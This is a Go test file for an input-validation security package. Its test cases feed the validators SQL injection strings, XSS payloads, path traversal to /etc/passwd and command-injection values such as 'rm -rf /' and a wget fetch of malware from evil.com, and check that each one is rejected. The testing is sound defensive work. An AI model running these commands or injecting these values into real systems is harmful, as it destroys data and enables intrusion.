package security

import (
	"regexp"
	"strings"
	"testing"
)

// Test SQL Injection Prevention
func TestStringValidator_SQLInjection(t *testing.T) {
	tests := []struct {
		name      string
		validator *StringValidator
		input     string
		wantErr   bool
		errMsg    string
	}{
		{
			name: "SQL injection - UNION SELECT",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
			},
			input:   "admin' UNION SELECT * FROM users--",
			wantErr: true,
			errMsg:  "string does not match required pattern",
		},
		{
			name: "SQL injection - OR 1=1",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
			},
			input:   "admin' OR '1'='1",
			wantErr: true,
			errMsg:  "string does not match required pattern",
		},
		{
			name: "SQL injection - comment",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
			},
			input:   "admin'--",
			wantErr: true,
			errMsg:  "string does not match required pattern",
		},
		{
			name: "SQL injection - DROP TABLE",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
			},
			input:   "'; DROP TABLE users;--",
			wantErr: true,
			errMsg:  "string does not match required pattern",
		},
		{
			name: "SQL injection - INSERT INTO",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
			},
			input:   "'; INSERT INTO users VALUES ('hacker', 'pass');--",
			wantErr: true,
			errMsg:  "string does not match required pattern",
		},
		{
			name: "valid alphanumeric input",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
			},
			input:   "john doe 123",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				} else if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("error = %v, want to contain %v", err, tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Command Injection Prevention
func TestStringValidator_CommandInjection(t *testing.T) {
	tests := []struct {
		name      string
		validator *StringValidator
		input     string
		wantErr   bool
	}{
		{
			name: "command injection - pipe",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s._-]+$`),
			},
			input:   "file.txt | cat /etc/passwd",
			wantErr: true,
		},
		{
			name: "command injection - semicolon",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s._-]+$`),
			},
			input:   "file.txt; rm -rf /",
			wantErr: true,
		},
		{
			name: "command injection - backticks",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s._-]+$`),
			},
			input:   "file.txt`whoami`",
			wantErr: true,
		},
		{
			name: "command injection - dollar sign",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s._-]+$`),
			},
			input:   "file$(whoami).txt",
			wantErr: true,
		},
		{
			name: "command injection - ampersand",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s._-]+$`),
			},
			input:   "file.txt & wget http://evil.com/malware",
			wantErr: true,
		},
		{
			name: "valid filename",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s._-]+$`),
			},
			input:   "my-file_123.txt",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test XSS Prevention
func TestStringValidator_XSSPrevention(t *testing.T) {
	tests := []struct {
		name      string
		validator *StringValidator
		input     string
		wantErr   bool
	}{
		{
			name: "XSS - script tag",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s.,!?-]+$`),
			},
			input:   "<script>alert('XSS')</script>",
			wantErr: true,
		},
		{
			name: "XSS - img onerror",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s.,!?-]+$`),
			},
			input:   "<img src=x onerror=alert('XSS')>",
			wantErr: true,
		},
		{
			name: "XSS - javascript protocol",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s.,!?-]+$`),
			},
			input:   "<a href='javascript:alert(1)'>click</a>",
			wantErr: true,
		},
		{
			name: "XSS - event handler",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s.,!?-]+$`),
			},
			input:   "<div onload=alert('XSS')>",
			wantErr: true,
		},
		{
			name: "valid text",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s.,!?-]+$`),
			},
			input:   "Hello world, this is a test!",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Path Traversal Prevention
func TestSanitizeFilePath_PathTraversal(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		baseDir string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "path traversal with ../",
			path:    "../../../etc/passwd",
			baseDir: "/var/app",
			wantErr: true,
			errMsg:  "path traversal detected",
		},
		{
			name:    "path traversal hidden in path",
			path:    "files/../../../etc/passwd",
			baseDir: "/var/app",
			wantErr: true,
			errMsg:  "path traversal detected",
		},
		{
			name:    "absolute path outside base",
			path:    "/etc/passwd",
			baseDir: "/var/app",
			wantErr: true,
			errMsg:  "outside allowed directory",
		},
		{
			name:    "encoded path traversal",
			path:    "..%2F..%2Fetc%2Fpasswd",
			baseDir: "/var/app",
			wantErr: true,
			errMsg:  "path traversal detected",
		},
		{
			name:    "valid path within base",
			path:    "files/document.txt",
			baseDir: "/var/app",
			wantErr: false,
		},
		{
			name:    "valid absolute path matching base",
			path:    "/var/app/files/document.txt",
			baseDir: "/var/app",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := SanitizeFilePath(tt.path, tt.baseDir)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				} else if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("error = %v, want to contain %v", err, tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Length Limits
func TestStringValidator_LengthLimits(t *testing.T) {
	tests := []struct {
		name      string
		validator *StringValidator
		input     string
		wantErr   bool
	}{
		{
			name: "exceeds max length",
			validator: &StringValidator{
				MaxLength: 10,
			},
			input:   "this string is too long",
			wantErr: true,
		},
		{
			name: "below min length",
			validator: &StringValidator{
				MinLength: 10,
			},
			input:   "short",
			wantErr: true,
		},
		{
			name: "within length range",
			validator: &StringValidator{
				MinLength: 5,
				MaxLength: 20,
			},
			input:   "just right",
			wantErr: false,
		},
		{
			name: "exactly max length",
			validator: &StringValidator{
				MaxLength: 10,
			},
			input:   "exactly10c",
			wantErr: false,
		},
		{
			name: "exactly min length",
			validator: &StringValidator{
				MinLength: 5,
			},
			input:   "five!",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Special Character Handling
func TestStringValidator_SpecialCharacters(t *testing.T) {
	tests := []struct {
		name      string
		validator *StringValidator
		input     string
		wantErr   bool
	}{
		{
			name: "null byte detection",
			validator: &StringValidator{
				DisallowNullBytes: true,
			},
			input:   "test\x00data",
			wantErr: true,
		},
		{
			name: "control character detection",
			validator: &StringValidator{
				DisallowControlChars: true,
			},
			input:   "test\x01\x02data",
			wantErr: true,
		},
		{
			name: "allow newlines and tabs",
			validator: &StringValidator{
				DisallowControlChars: true,
			},
			input:   "test\nwith\ttabs",
			wantErr: false,
		},
		{
			name: "clean string",
			validator: &StringValidator{
				DisallowNullBytes:    true,
				DisallowControlChars: true,
			},
			input:   "clean string with spaces",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Boundary Conditions
func TestStringValidator_BoundaryConditions(t *testing.T) {
	tests := []struct {
		name      string
		validator *StringValidator
		input     string
		wantErr   bool
	}{
		{
			name:      "empty string with no constraints",
			validator: &StringValidator{},
			input:     "",
			wantErr:   false,
		},
		{
			name: "empty string with min length",
			validator: &StringValidator{
				MinLength: 1,
			},
			input:   "",
			wantErr: true,
		},
		{
			name: "single character at min length",
			validator: &StringValidator{
				MinLength: 1,
			},
			input:   "a",
			wantErr: false,
		},
		{
			name: "unicode characters within byte limit",
			validator: &StringValidator{
				MaxLength: 20, // "hello世界" is 11 bytes (hello=5, 世=3, 界=3)
			},
			input:   "hello世界",
			wantErr: false,
		},
		{
			name: "very long string",
			validator: &StringValidator{
				MaxLength: 100,
			},
			input:   strings.Repeat("a", 1000),
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Integer Validator
func TestIntValidator(t *testing.T) {
	min := 0
	max := 100

	tests := []struct {
		name      string
		validator *IntValidator
		input     any
		wantErr   bool
	}{
		{
			name: "valid int",
			validator: &IntValidator{
				Min: &min,
				Max: &max,
			},
			input:   50,
			wantErr: false,
		},
		{
			name: "below minimum",
			validator: &IntValidator{
				Min: &min,
			},
			input:   -10,
			wantErr: true,
		},
		{
			name: "above maximum",
			validator: &IntValidator{
				Max: &max,
			},
			input:   150,
			wantErr: true,
		},
		{
			name:      "invalid type",
			validator: &IntValidator{},
			input:     "not a number",
			wantErr:   true,
		},
		{
			name: "int64 conversion",
			validator: &IntValidator{
				Min: &min,
				Max: &max,
			},
			input:   int64(75),
			wantErr: false,
		},
		{
			name: "float64 conversion",
			validator: &IntValidator{
				Min: &min,
				Max: &max,
			},
			input:   float64(80),
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Float Validator
func TestFloatValidator(t *testing.T) {
	min := 0.0
	max := 100.0

	tests := []struct {
		name      string
		validator *FloatValidator
		input     any
		wantErr   bool
	}{
		{
			name: "valid float",
			validator: &FloatValidator{
				Min: &min,
				Max: &max,
			},
			input:   50.5,
			wantErr: false,
		},
		{
			name: "below minimum",
			validator: &FloatValidator{
				Min: &min,
			},
			input:   -10.5,
			wantErr: true,
		},
		{
			name: "above maximum",
			validator: &FloatValidator{
				Max: &max,
			},
			input:   150.5,
			wantErr: true,
		},
		{
			name:      "invalid type",
			validator: &FloatValidator{},
			input:     "not a number",
			wantErr:   true,
		},
		{
			name: "int conversion",
			validator: &FloatValidator{
				Min: &min,
				Max: &max,
			},
			input:   75,
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test SanitizeString
func TestSanitizeString(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "remove null bytes",
			input:    "test\x00data",
			expected: "testdata",
		},
		{
			name:     "remove control characters",
			input:    "test\x01\x02data",
			expected: "testdata",
		},
		{
			name:     "keep newlines and tabs",
			input:    "test\nwith\ttabs",
			expected: "test\nwith\ttabs",
		},
		{
			name:     "clean string unchanged",
			input:    "clean string",
			expected: "clean string",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeString(tt.input)
			if result != tt.expected {
				t.Errorf("SanitizeString() = %q, want %q", result, tt.expected)
			}
		})
	}
}

// Test ValidateToolName
func TestValidateToolName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "valid tool name",
			input:   "my-tool_123",
			wantErr: false,
		},
		{
			name:    "valid tool name with namespace",
			input:   "namespace:tool-name",
			wantErr: false,
		},
		{
			name:    "empty tool name",
			input:   "",
			wantErr: true,
		},
		{
			name:    "tool name too long",
			input:   strings.Repeat("a", 101),
			wantErr: true,
		},
		{
			name:    "invalid characters",
			input:   "tool@name!",
			wantErr: true,
		},
		{
			name:    "spaces not allowed",
			input:   "tool name",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateToolName(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test ValidateJSONObject
func TestValidateJSONObject(t *testing.T) {
	tests := []struct {
		name    string
		input   any
		wantErr bool
	}{
		{
			name:    "valid JSON object",
			input:   map[string]any{"key": "value"},
			wantErr: false,
		},
		{
			name:    "nil value",
			input:   nil,
			wantErr: true,
		},
		{
			name:    "string instead of object",
			input:   "not an object",
			wantErr: true,
		},
		{
			name:    "array instead of object",
			input:   []string{"not", "object"},
			wantErr: true,
		},
		{
			name:    "empty object",
			input:   map[string]any{},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateJSONObject(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Benchmark tests
func BenchmarkStringValidator_Pattern(b *testing.B) {
	validator := &StringValidator{
		Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
	}
	input := "valid input 123"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = validator.Validate(input)
	}
}

func BenchmarkSanitizeFilePath(b *testing.B) {
	path := "files/document.txt"
	baseDir := "/var/app"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = SanitizeFilePath(path, baseDir)
	}
}

func BenchmarkSanitizeString(b *testing.B) {
	input := "test\nwith\x00null\x01control"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = SanitizeString(input)
	}
}
